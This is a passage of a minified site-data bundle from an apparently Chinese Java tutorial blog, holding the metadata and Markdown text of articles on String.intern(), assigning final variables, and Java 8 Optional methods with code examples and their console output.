方法可以减少内存中相同字符串的数量，节省一些内存空间。",normalizedContent:"string.intern() 方法可以使得所有含相同内容的字符串都共享同一个内存对象。\n\njvm 中，存在一个字符串常量池，字符串的值都存放在这个池中。当调用 intern 方法时，如果字符串常量池中已经存在该字符串，那么返回池中的字符串；否则将此字符串添加到字符串常量池中，并返回字符串的引用。\n\njdk1.6 和 jdk1.7 在 intern() 方法的实现上，有相同，也有不同。\n\n相同点： 先去查看字符串常量池是否有该字符串，如果有，则返回字符串常量池中的引用。 不同点： 如果是 jdk1.7，当字符串常量池中找不到对应的字符串时，不会将字符串拷贝到字符串常量池，而只是生成一个对该字符串的引用在字符串常量池。而 jdk1.6 会拷贝字符串至字符串常量池。\n\njdk1.6 中，常量池在方法区。jdk1.7 中，常量池移到堆区了。\n\n\n\n注意：字符串常量池中的 string 对象，也是可以被 gc 回收的，只要它不再被引用了。\n\nstring.intern 方法可以减少内存中相同字符串的数量，节省一些内存空间。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java 中为 final 变量赋值的几种方式",frontmatter:{title:"java 中为 final 变量赋值的几种方式",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/644e67/",categories:["java","基础"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/10.java%20%E4%B8%AD%E4%B8%BA%20final%20%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F.html",relativePath:"04.java/01.基础/10.java 中为 final 变量赋值的几种方式.md",key:"v-7952bb62",path:"/pages/644e67/",headers:[{level:2,title:"java 中为 final 变量赋值的几种方式",slug:"java-中为-final-变量赋值的几种方式",normalizedTitle:"java 中为 final 变量赋值的几种方式",charIndex:27}],headersStr:"java 中为 final 变量赋值的几种方式",content:"> 本文原文地址 blog.csdn.net\n\n\n# java 中为 final 变量赋值的几种方式\n\n * final 修饰的变量并不是在申明的时候就必须得赋值\n * 被 final 修饰的变量，有三种赋值方式：\n\n 1. 在声明时直接赋值\n\nprivate final int finalVal = 10;\n\n\n1\n\n 2. 先声明，然后在构造方法中赋值（最常用的方式）\n\nclass Demo {\n\t    private final int finalVal;\n\t    public Demo (int val){\n\t        this.finalVal = val;\n\t    }\n\t }\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 先声明，然后在构造代码块中赋值\n\nprivate final int finalVal;\n\t    {\n\t        this.finalVal = 10;\n\t    }\n\n\n1\n2\n3\n4\n\n * 被 final static 修饰的变量，有两种赋值方式：\n\n 1. 在定义时直接赋值\n\npublic static final int finalVal = 10;\n\n\n1\n\n 2. 在静态代码块里赋值\n\npublic static final int finalVal;\nstatic {\n  finalVal = 10;\n}\n\n\n1\n2\n3\n4\n",normalizedContent:"> 本文原文地址 blog.csdn.net\n\n\n# java 中为 final 变量赋值的几种方式\n\n * final 修饰的变量并不是在申明的时候就必须得赋值\n * 被 final 修饰的变量，有三种赋值方式：\n\n 1. 在声明时直接赋值\n\nprivate final int finalval = 10;\n\n\n1\n\n 2. 先声明，然后在构造方法中赋值（最常用的方式）\n\nclass demo {\n\t    private final int finalval;\n\t    public demo (int val){\n\t        this.finalval = val;\n\t    }\n\t }\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 先声明，然后在构造代码块中赋值\n\nprivate final int finalval;\n\t    {\n\t        this.finalval = 10;\n\t    }\n\n\n1\n2\n3\n4\n\n * 被 final static 修饰的变量，有两种赋值方式：\n\n 1. 在定义时直接赋值\n\npublic static final int finalval = 10;\n\n\n1\n\n 2. 在静态代码块里赋值\n\npublic static final int finalval;\nstatic {\n  finalval = 10;\n}\n\n\n1\n2\n3\n4\n",charsets:{cjk:!0},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"Java8 新特性之 Optional 正确理解和用法",frontmatter:{title:"Java8 新特性之 Optional 正确理解和用法",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/ee7b99/",categories:["java","基础"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/01.%E5%9F%BA%E7%A1%80/11.Java8%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Optional%20%E6%AD%A3%E7%A1%AE%E7%90%86%E8%A7%A3%E5%92%8C%E7%94%A8%E6%B3%95.html",relativePath:"04.java/01.基础/11.Java8 新特性之 Optional 正确理解和用法.md",key:"v-52936b54",path:"/pages/ee7b99/",headers:[{level:4,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:27},{level:4,title:"拓展资料",slug:"拓展资料",normalizedTitle:"拓展资料",charIndex:207},{level:2,title:"Java8 新特性之 Optional 正确理解和用法",slug:"java8-新特性之-optional-正确理解和用法",normalizedTitle:"java8 新特性之 optional 正确理解和用法",charIndex:567},{level:3,title:"一、Optional 简介",slug:"一、optional-简介",normalizedTitle:"一、optional 简介",charIndex:599},{level:3,title:"二、Optional 类描述",slug:"二、optional-类描述",normalizedTitle:"二、optional 类描述",charIndex:1107},{level:3,title:"三、Optional 常用方法及使用示例",slug:"三、optional-常用方法及使用示例",normalizedTitle:"三、optional 常用方法及使用示例",charIndex:2934},{level:4,title:"1、静态方法 Optional.of()",slug:"_1、静态方法-optional-of",normalizedTitle:"1、静态方法 optional.of()",charIndex:2958},{level:4,title:"2、静态方法 Optional.ofNullable()",slug:"_2、静态方法-optional-ofnullable",normalizedTitle:"2、静态方法 optional.ofnullable()",charIndex:3792},{level:4,title:"3、对象方法 isPresent()",slug:"_3、对象方法-ispresent",normalizedTitle:"3、对象方法 ispresent()",charIndex:4370},{level:4,title:"4、对象方法 get()",slug:"_4、对象方法-get",normalizedTitle:"4、对象方法 get()",charIndex:5083},{level:4,title:"5、对象方法 ifPresent()",slug:"_5、对象方法-ifpresent",normalizedTitle:"5、对象方法 ifpresent()",charIndex:5971},{level:4,title:"6、对象方法 orElse()",slug:"_6、对象方法-orelse",normalizedTitle:"6、对象方法 orelse()",charIndex:7019},{level:4,title:"7、对象方法 orElseGet()",slug:"_7、对象方法-orelseget",normalizedTitle:"7、对象方法 orelseget()",charIndex:7785},{level:4,title:"8、对象方法 orElseThrow()",slug:"_8、对象方法-orelsethrow",normalizedTitle:"8、对象方法 orelsethrow()",charIndex:8798},{level:4,title:"9、对象方法 map()",slug:"_9、对象方法-map",normalizedTitle:"9、对象方法 map()",charIndex:10342},{level:4,title:"10、对象方法 flatMap()",slug:"_10、对象方法-flatmap",normalizedTitle:"10、对象方法 flatmap()",charIndex:12613},{level:4,title:"11、对象方法 filter()",slug:"_11、对象方法-filter",normalizedTitle:"11、对象方法 filter()",charIndex:13603},{level:3,title:"四、Optional 常用示例组合",slug:"四、optional-常用示例组合",normalizedTitle:"四、optional 常用示例组合",charIndex:14584},{level:4,title:"对集合中的对象属性进行过滤",slug:"对集合中的对象属性进行过滤",normalizedTitle:"对集合中的对象属性进行过滤",charIndex:14792},{level:4,title:"map 经典判空之嵌套 if",slug:"map-经典判空之嵌套-if",normalizedTitle:"map 经典判空之嵌套 if",charIndex:16421}],headersStr:"参考资料 拓展资料 Java8 新特性之 Optional 正确理解和用法 一、Optional 简介 二、Optional 类描述 三、Optional 常用方法及使用示例 1、静态方法 Optional.of() 2、静态方法 Optional.ofNullable() 3、对象方法 isPresent() 4、对象方法 get() 5、对象方法 ifPresent() 6、对象方法 orElse() 7、对象方法 orElseGet() 8、对象方法 orElseThrow() 9、对象方法 map() 10、对象方法 flatMap() 11、对象方法 filter() 四、Optional 常用示例组合 对集合中的对象属性进行过滤 map 经典判空之嵌套 if",content:'> 本文原文地址 www.aqwdzy.com\n\n# 参考资料\n\n * Oracle JDK API 参考文档 https://docs.oracle.com/javase/8/docs/api/java/util/Optional.html\n * 菜鸟教程 - Java 8 Optional 类 https://www.runoob.com/java/java8-optional-class.html\n\n# 拓展资料\n\n * Java8 - 函数式编程 https://blog.csdn.net/icarusliu/article/details/79495534\n * Java8 Optional 最佳实践（科学访问） https://medium.com/12-developer-labors/must-read-on-optional-type-b171e1b397bb\n * 正确的使用 Java8 中的 Optional 类来消除代码中的 null 检查 https://lw900925.github.io/java/java8-optional.html\n * Java 8 中的 Optional 的优点究竟在哪里？https://www.zhihu.com/question/444199629\n\n\n# Java8 新特性之 Optional 正确理解和用法\n\n\n# 一、Optional 简介\n\nOptional 是一个容器对象，可以存储对象、字符串等值，当然也可以存储 null 值。Optional 提供很多有用的方法，能帮助我们将 Java 中的对象等一些值存入其中，这样我们就不用显式进行空值检测，使我们能够用少量的代码完成复杂的流程。\n\n比如它提供了：\n\n * of() 方法，可以将值存入 Optional 容器中，如果存入的值是 null 则抛异常。\n\n * ofNullable() 方法，可以将值存入 Optional 容器中，即使值是 null 也不会抛异常。\n\n * get() 方法，可以获取容器中的值，如果值为 null 则抛出异常。\n\n * getElse() 方法，可以获取容器中的值，如果值为 null 则返回设置的默认值。\n\n * isPresent() 方法，该方法可以判断存入的值是否为空。\n\n * … 等等一些其它常用方法，下面会进行介绍。\n\n可以说，使用 Optional 可以帮助我们解决业务中，减少值动不动就抛出空指针异常问题，也减少 null 值的判断，提高代码可读性等，这里我们介绍下，如果使用这个 Optional 类。\n\n\n# 二、Optional 类描述\n\n * Optional 类所在包： java.util.Optional\n * Optional 类声明： public final class Optional extends Object\n * **Optional 类方法：\n\n方法                                                     修饰符&返回值类型         介绍\nempty()                                                static Optional   创建一个空的Optional实例\nequals(Object obj)                                     boolean           返回是否与this相等，是对应true\nfilter(Predicate<? super T> predicate)                 Optional          如果存在且满足Predicate条件则返回自己，否则返回空 Optional。\nflatMap(Function<? super T,Optional> mapper)           Optional          如果值存在，返回function返回的结果，否则返回空Optional。\nget()                                                  T                 如果Optional包裹的值存在，则返回值，否则抛出NoSuchElementException异常。【尽量不要主动调用，如果非要用，还要加上try-catch，不如直接if!=null】\nhashCode()                                             int               如果有值就返回值的hash码，没值返回0\nifPresent(Consumer<? super T> consumer)                void              如果有值则调用Consumer，没值啥也不干。\nisPresent()                                            boolean           返回值是否存在，是对应true\nmap(Function<? super T,? extends U> mapper)            Optional          如果有值，则将提供的函数应用于该值，如果结果不为空，则返回包含新值的Optional\nof(T value)                                            static Optional   返回带有该值的Optional【如果传入null，会抛出NullPointerException异常】\nofNullable(T value)                                    static Optional   返回带有该值的Optional，如果传入null，返回空的Optional【如果传入null，不会抛出异常】\norElse(T other)                                        T                 Optional中有值返回值，无值返回other\norElseGet(Supplier<? extends T> other)                 T                 Optional中有值返回值，无值调用other，返回调用结果\norElseThrow(Supplier<? extends X> exceptionSupplier)   T                 Optional中有值返回值，无值抛出你传入的异常\ntoString()                                             String            返回值的字符串形式，适用于调试\n\n\n# 三、Optional 常用方法及使用示例\n\n# 1、静态方法 Optional.of()\n\n * 方法作用： 为指定的值创建一个指定非 null 值的 Optional。\n * 方法描述： of 方法通过工厂方法创建 Optional 实例，需要注意的是传入的参数不能为 null，否则抛出 NullPointerException。\n * ** 返回类型：**Optional\n * 示例代码：\n\n调用两个 Optional.of() 方法，一个传入正常参数，另一个传入 null 参数：\n\npublic static void main(String[] args) {\n    // 传入正常值，正常返回一个 Optional 对象\n    Optional<String> optional1 = Optional.of("mydlq");\n    \n    // 传入参数为 null，抛出 NullPointerException.\n    Optional optional2 = Optional.of(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n运行代码，可以观察到控制台输出内容如下：\n\nException in thread "main" java.lang.NullPointerException\n\tat java.util.Objects.requireNonNull(Objects.java:203)\n\tat java.util.Optional.<init>(Optional.java:96)\n\tat java.util.Optional.of(Optional.java:108)\n\tat club.mydlq.OptionalExample.main(OptionalExample.java:12)\n\n\n1\n2\n3\n4\n5\n\n\n可以看到传入正常参数正常返回 Optional 对象，传入 null 参数返回 NullPointerException 异常。\n\n# 2、静态方法 Optional.ofNullable()\n\n * 方法作用： 为指定的值创建一个 Optional 对象，如果指定的参数为 null，不抛出异常，直接则返回一个空的 Optional 对象。\n * 方法描述： ofNullable 方法是和 of 方式一样，都是用于创建 Optional 对象，只是传入的参数 null 时，会返回一个空的 Optional 对象，而不会抛出 NullPointerException 异常。\n * 返回类型： Optional\n * 示例代码：\n\n调用 Optional.ofNullable() 方法，传入 null 参数：\n\npublic static void main(String[] args) {\n    // 传入正常值，正常返回一个 Optional 对象\n    Optional<String> optional1 = Optional.ofNullable("mydlq");\n    \n    // 传入 null 参数，正常返回 Optional 对象\n    Optional optional2 = Optional.ofNullable(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n运行代码，可以观察到正常传入值和传入 null 值时，都没有抛出异常。\n\n# 3、对象方法 isPresent()\n\n * 方法作用： 如果值存在则方法会返回 true，否则返回 false。\n * 方法描述： 该方法其实就是用于判断创建 Optional 时传入参数的值是否为空，实现代码就简单一行，即 value != null 所以如果不为空则返回 true，否则返回 false。\n * 返回类型： boolean\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 传入正常值，正常返回一个 Optional 对象，并使用 isPresent 方法\n    Optional optional1 = Optional.ofNullable("mydlq");\n    System.out.println("传入正常值返回：" + optional1.isPresent());\n\n    // 传入参数为 null 生成一个 Optional 对象，并使用 isPresent 方法\n    Optional optional2 = Optional.ofNullable(null);\n    System.out.println("传入 null 值返回：" + optional2.isPresent());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n传入正常值返回：true\n传入 null 值返回：false\n\n\n1\n2\n\n\n可以看到传入正常参数时调用 Optional 对象的 isPresent 方法时返回 true，传入 null 参数返回 false。\n\n# 4、对象方法 get()\n\n * 方法作用： 如果 Optional 有值则将其返回，否则抛出 NoSuchElementException 异常。\n * 方法描述： get 方法内部实现其实就是判断 Otpional 对象中的 value 属性是否为 null，如果是就抛出 NoSuchElementException 异常，否则返回这个 value 值。\n * 返回类型： T\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 传入正常值，正常返回一个 Optional 对象，并使用 get 方法获取值\n    Optional optional1 = Optional.ofNullable("mydlq");\n    System.out.println(optional1.get());\n\n    // 传入参数为 null 生成一个 Optional 对象，并使用 get 方法获取值\n    Optional optional2 = Optional.ofNullable(null);\n    System.out.println(optional2.get());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n传入正常参数：mydlq\nException in thread "main" java.util.NoSuchElementException: No value present\n\tat java.util.Optional.get(Optional.java:135)\n\tat club.mydlq.OptionalExample.main(OptionalExample.java:14)\n\n\n1\n2\n3\n4\n\n\nBASH 可以观察到传入正常值的 Optional 调用 get 方法正常输出值，通过空的 optional 对象使用 get 方法获取值时，抛出 NoSuchElementException 异常。\n\n# 5、对象方法 ifPresent()\n\n * 方法作用： 如果值存在则使用该值调用 consumer , 否则不做任何事情。\n * 方法描述： 该方法 ifPresent(Consumer<? super T> consumer) 中参数接收的是 Consumer 类，它包含一个接口方法 accept()，该方法能够对传入的值进行处理，但不会返回结果。这里传入参数可以传入 Lamdda 表达式或 Consumer 对象及实现 Consumer 接口的类的对象。\n * 返回类型： void\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 创建 Optional 对象，然后调用 Optional 对象的 ifPresent 方法，传入 Lambda 表达式\n    Optional optional1 = Optional.ofNullable("mydlq1");\n    optional1.ifPresent((value) -> System.out.println("Optional 的值为：" + value));\n\n    // 创建 Optional 对象，调用 Optional 对象的 ifPresent 方法，传入实现 Consumer 匿名内部类\n    Optional optional2 = Optional.ofNullable("mydlq2");\n    Consumer<String> consumer = new Consumer() {\n        @Override\n        public void accept(Object value) {\n            System.out.println("Optional 的值为：" + value);\n        }\n    };\n    optional2.ifPresent(consumer);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n运行代码，可以观察到控制台输出内容如下：\n\nOptional 的值为：mydlq1\nOptional 的值为：mydlq2\n\n\n1\n2\n\n\n可以观察到，调用 ifPresent 使用 lambda 或者内部匿名类方法，都是为了再执行 Optional 对象的 ifPresent 方法时，执行一段代码逻辑。\n\n# 6、对象方法 orElse()\n\n * 方法作用： 如果该值存在就直接返回， 否则返回指定的其它值。\n * 方法描述： orElse 方法实现很简单，就是使用三目表达式对传入的参数值进行 null 验证，即 value != null ? value : other; 如果为 null 则返回 true，否则返回 false。\n * 返回类型： T\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 传入正常参数，获取一个 Optional 对象，并使用 orElse 方法设置默认值\n    Optional optional1 = Optional.ofNullable("mydlq");\n    Object object1 = optional1.orElse("默认值");\n    System.out.println("如果值不为空："+object1);\n\n    // 传入 null 参数，获取一个 Optional 对象，并使用 orElse 方法设置默认值\n    Optional optional2 = Optional.ofNullable(null);\n    Object object2 = optional2.orElse("默认值");\n    System.out.println("如果值为空："+object2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n如果值不为空：mydlq\n如果值为空：默认值\n\n\n1\n2\n\n\n可以观察到，如果 Optional 的值为空，则返回 orElse() 方法设置的默认值，否则返回 Optional 中的值。\n\n# 7、对象方法 orElseGet()\n\n * 方法作用： 如果该值存在就返回值，否则触发 other，并返回 other 调用的结果。\n * 方法描述： orElseGet 方法和 orElse 方法类似，都是在 Optional 值为空时，返回一个默认操作，只不过 orElse 返回的是默认值，而 orElseGet 是执行 lambda 表达式，然后返回 lambda 表达式执行后的结果。\n * 返回类型： T\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 传入正常参数，获取一个 Optional 对象，并使用 orElse 方法设置默认值\n    Optional optional1 = Optional.ofNullable("mydlq");\n    Object object1 = optional1.orElseGet(() -> {\n        String defaultVal = "执行逻辑和生成的默认值";\n        return defaultVal;\n    });\n    System.out.println("输出的值为："+object1);\n\n    // 传入 null 参数，获取一个 Optional 对象，并使用 orElse 方法设置默认值\n    Optional optional2 = Optional.ofNullable(null);\n    Object object2 = optional2.orElseGet(() -> {\n        String defaultVal = "执行逻辑和生成的默认值";\n        return defaultVal;\n    });\n    System.out.println("输出的值为："+object2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n输出的值为：mydlq\n输出的值为：执行逻辑和生成的默认值\n\n\n1\n2\n\n\n可也观察到，当 Optional 值为不为空时正常返回带值的 Optional，如果 Optional 为空则返回 orElseGet 方法中 lambda 表达式执行后生成的值。\n\n# 8、对象方法 orElseThrow()\n\n * 方法作用： 如果 Optional 存在该值，返回包含的值，否则抛出由 Supplier 继承的异常。\n * 方法描述： orElseThrow 方法其实就是判断创建 Optional 时传入的参数是否为 null，如果是非 null 则返回传入的值，否则抛出 异常。\n * 返回类型： T\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 传入正常参数，获取一个 Optional 对象，并使用 orElseThrow 方法\n    try {\n        Optional optional1 = Optional.ofNullable("mydlq");\n        Object object1 = optional1.orElseThrow(() -> {\n                    System.out.println("执行逻辑，然后抛出异常");\n                    return new RuntimeException("抛出异常");\n                }\n        );\n        System.out.println("输出的值为：" + object1);\n    } catch (Throwable throwable) {\n        throwable.printStackTrace();\n    }\n    \n    // 传入 null 参数，获取一个 Optional 对象，并使用 orElseThrow 方法\n    try {\n        Optional optional2 = Optional.ofNullable(null);\n        Object object2 = optional2.orElseThrow(() -> {\n                    System.out.println("执行逻辑，然后抛出异常");\n                    return new RuntimeException("抛出异常");\n                }\n        );\n        System.out.println("输出的值为：" + object2);\n    } catch (Throwable throwable) {\n        throwable.printStackTrace();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n值为不为空输出的值：mydlq\n执行逻辑，然后抛出异常\njava.lang.RuntimeException: 抛出异常\n\tat club.mydlq.OptionalExample.lambda$main$1(OptionalExample.java:25)\n\tat java.util.Optional.orElseThrow(Optional.java:290)\n\tat club.mydlq.OptionalExample.main(OptionalExample.java:23)\n\n\n1\n2\n3\n4\n5\n6\n\n\n可以观察到，当创建 Optional 时如果传入的参数为空则执行 Lambda 表达式代码逻辑后抛出异常信息，否则返回传入的参数值。\n\n# 9、对象方法 map()\n\n * 方法作用： 如果有值，则对其执行调用映射函数得到返回值。如果返回值不为 null，则创建包含映射返回值的 Optional 作为 map 方法返回值，否则返回空 Optional。\n * 方法描述： map 方法主要用于获取某个对象中的某个属性值的 Optional 对象时使用。map 方法调用时，首先验证传入的映射函数是否为空，如果为空则抛出异常。然后，再检测 Optional 的 value 是否为空，如果是，则返回一个空 value 的 Optional 对象。如果传入的映射函数和 Optinal 的 value 都不为空，则返回一个带 value 对象属性的 Optional 对象。\n * 返回类型： Optional\n * 示例代码：\n\n示例 1： 创建 Map 集合，存储一些键值对信息，通过 Optional 操作 Map 获取值，然后观察：\n\npublic static void main(String[] args) {\n    // 创建 map 对象\n    Map<String, String> userMap = new HashMap<>();\n    userMap.put("name1", "mydlq");\n    userMap.put("name2", null);\n\n    // 传入 Map 对象参数，获取一个 Optional 对象，获取 name1 属性\n    Optional<String> optional1 = Optional.of(userMap).map(value -> value.get("name1"));\n\n    // 传入 Map 对象参数，获取一个 Optional 对象，获取 name2 属性\n    Optional<String> optional2 = Optional.of(userMap).map(value -> value.get("name2"));\n\n    // 获取 Optional 的值\n    System.out.println("获取的 name1 的值：" + optional1.orElse("默认值"));\n    System.out.println("获取的 name2 的值：" + optional2.orElse("默认值"));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n获取的 Optional 的值：mydlq\n获取的 Optional 的值：默认值\n\n\n1\n2\n\n\n示例 2： 创建一个用户类，使用 Optional 操作用户对象，获取其 name 参数，结合 Optional 的 map 方法获取值，进行观察：\n\npublic class User {\n\n    private String name;\n\n    public User(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n    public void setName(String name) {\n        this.name = name;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n使用 Optional 的 map 方法对值处理：\n\npublic static void main(String[] args) {\n    // 创建一个对象，设置姓名属性而不设置性别，这时候性别为 null\n    User user1 = new User("测试名称");\n    User user2 = new User();\n\n    // 使用 Optional 存储 User 对象\n    Optional<User> optional1 = Optional.ofNullable(user1);\n    Optional<User> optional2 = Optional.ofNullable(user2);\n\n    // 获取对象的 name 属性值\n    String name1 = optional1.map(User::getName).orElse("未填写");\n    String name2 = optional2.map(User::getName).orElse("未填写");\n\n    // 输出结果\n    System.out.println("获取的名称：" + name1);\n    System.out.println("获取的名称：" + name2);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n获取的名称：测试名称\n获取的名称：未填写\n\n\n1\n2\n\n\n总结：\n\n通过上面两个示例观察到，通过 Optional 对象的 map 方法能够获取映射对象中的属性，创建 Optional 对象，并以此属性充当 Optional 的值，结合 orElse 方法，如果获取的属性的值为空，则设置个默认值。\n\n# 10、对象方法 flatMap()\n\n * 方法作用： 如果值存在，返回基于 Optional 包含的映射方法的值，否则返回一个空的 Optional。\n * 方法描述： flatMap 方法和 map 方法类似，唯一的不同点就是 map 方法会对返回的值进行 Optional 封装，而 flatMap 不会，它需要手动执行 Optional.of 或 Optional.ofNullable 方法对 Optional 值进行封装。\n * 返回类型： Optional\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 创建 map 对象\n    Map<String, String> userMap = new HashMap<>();\n    userMap.put("name", "mydlq");\n    userMap.put("sex", "男");\n\n    // 传入 Map 对象参数，获取一个 Optional 对象\n    Optional<Map<String, String>> optional1 = Optional.of(userMap);\n\n    // 使用 Optional 的 flatMap 方法，获取 Map 中的 name 属性\n    // 然后通过获取的值手动创建一个新的 Optional 对象\n    Optional optional2 = optional1.flatMap(value -> Optional.ofNullable(value.get("name")));\n\n    // 获取 Optional 的 value\n    System.out.println("获取的 Optional 的值：" + optional2.get());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n运行代码，可以观察到控制台输出内容如下：\n\n获取的 Optional 的值：mydlq\n\n\n1\n\n\n根据结果观察，可以看到 flatMap 和 map 方法没有什么区别，但是仔细看，代码中调用 flatMap 后，需要手动执行 of 或 ofNullable 方法创建了 Optional 对象。\n\n# 11、对象方法 filter()\n\n * 方法作用： 如果有值并且满足断言条件返回包含该值的 Optional，否则返回空 Optional。\n * 方法描述： filter 方法通过传入的限定条件对 Optional 实例的值进行过滤，如果 Optional 值不为空且满足限定条件就返回包含值的 Optional，否则返回空的 Optional。这里设置的限定条件需要使用实现了 Predicate 接口的 lambda 表达式来进行配置。\n * 返回类型： Optional\n * 示例代码：\n\npublic static void main(String[] args) {\n    // 创建一个测试的 Optional 对象\n    Optional<String> optional = Optional.ofNullable("mydlq");\n    // 调用 Optional 的 filter 方法，设置一个满足的条件，然后观察获取的 Optional 对象值是否为空\n    Optional optional1 =optional.filter((value) -> value.length() > 2);\n    System.out.println("Optional 的值不为空：：" + optional.isPresent());\n\n    // 调用 Optional 的 filter 方法，设置一个不满足的条件，然后观察获取的 Optional 对象值是否为空\n    Optional optional2 =optional.filter((value) -> value.length() <2);\n    System.out.println("Optional 的值不为空：：" + optional2.isPresent());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n运行代码，可以观察到控制台输出内容如下：\n\nOptional 的值不为空：true\nOptional 的值不为空：false\n\n\n1\n2\n\n\n根据结果可以观察到，可以通过 filter 设置一个条件来判断 Optional 的值，如果满足条件就返回带值的 Optional，否则返回空的 Optional。\n\n\n# 四、Optional 常用示例组合\n\n在介绍一栏中已经说过 Optional 是个容器，它可用保存类型的 T 的值，即使 T 为 null 也可以使用 Optional 存储，这样我就不用显示进行空值检测，防止空指针异常。\n\n上面也介绍了 Optional 的各种方法，在实际使用中这些方法常常组合使用。且很多方法也常与 Lambda 表达式结合，获取我们想要的结果的值。\n\n下面是常用的示例，可以作为参考：\n\n# 对集合中的对象属性进行过滤\n\n创建一个 User 对象实体类，里面包含 name 属性：\n\npublic class User {\n    private String name;\n\n    public User(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n    public void setName(String name) {\n        this.name = name;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n创建一个使用 main 方法的类，创建几个 User 对象且设置不同的值，有的对象为 null 有的属性不设置，然后通过 Optional 获取 name 属性值加入集合，进行测试：\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\n\npublic class OptionalExample {\n\n    /**\n     * 测试的 main 方法\n     */\n    public static void main(String[] args) {\n        // 创建一个测试的用户集合\n        List<User> userList = new ArrayList<>();\n\n        // 创建几个测试用户\n        User user1 = new User("abc");\n        User user2 = new User("efg");\n        User user3 = null;\n\n        // 将用户加入集合\n        userList.add(user1);\n        userList.add(user2);\n        userList.add(user3);\n\n        // 创建用于存储姓名的集合\n        List<String> nameList = new ArrayList();\n        // 循环用户列表获取用户信息，值获取不为空且用户以 a 开头的姓名，\n        // 如果不符合条件就设置默认值，最后将符合条件的用户姓名加入姓名集合\n        for (User user : userList) {\n            nameList.add(Optional.ofNullable(user).map(User::getName).filter(value -> value.startsWith("a")).orElse("未填写"));\n        }\n\n        // 输出名字集合中的值\n        System.out.println("通过 Optional 过滤的集合输出：");\n        nameList.stream().forEach(System.out::println);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n输出运行结果：\n\n通过 Optional 过滤的集合输出：\nabc\n未填写\n未填写\n\n\n1\n2\n3\n4\n\n\n通过上面，可以观察到，使用 Optional 有时候可以很方便的过滤一些属性，而且它的方法可以通过链式调用，方法间相互组合使用，使我们用少量的代码就能完成复杂的逻辑。\n\n# map 经典判空之嵌套 if\n\n判断 map 不为空，map 中的 key-value 不为 null 且不为空白字符串，常规玩法要么是一组嵌套 if，要是是一个 tay-catch，\n\npublic static void main(String[] args) {\n    System.out.println(test1());\n    System.out.println(test2());\n    System.out.println(test3());\n    System.out.println(test4());\n}\npublic static String test1() {\n    //假装外部传入不可控map一个，比如sevlet接受前端传参\n    Map pm = new HashMap();\n    pm.put("key1", "value1");\n\n\n    Optional<Map> mapOptional = Optional.ofNullable(pm);\n\n    return mapOptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatMap(value -> {\n                //一大堆业务处理...\n                return Optional.ofNullable("test1成功执行");\n            }).orElse("test1停车了");\n}\n\npublic static String test2() {\n    //假装外部传入不可控map一个，比如sevlet接受前端传参\n    Map pm = new HashMap();\n    pm.put("key1", "");\n    Optional<Map> mapOptional = Optional.ofNullable(pm);\n    return mapOptional.map(map -> map.get("key1"))\n            .filter(value -> !"".equals(value))\n            .flatMap(value -> {\n                //一大堆业务处理...\n                return Optional.ofNullable("test2成功执行");\n            }).orElse("test2停车了");\n}\n\n\npublic static String test3() {\n    //假装外部传入不可控map一个，比如sevlet接受前端传参\n    Map pm = new HashMap();\n    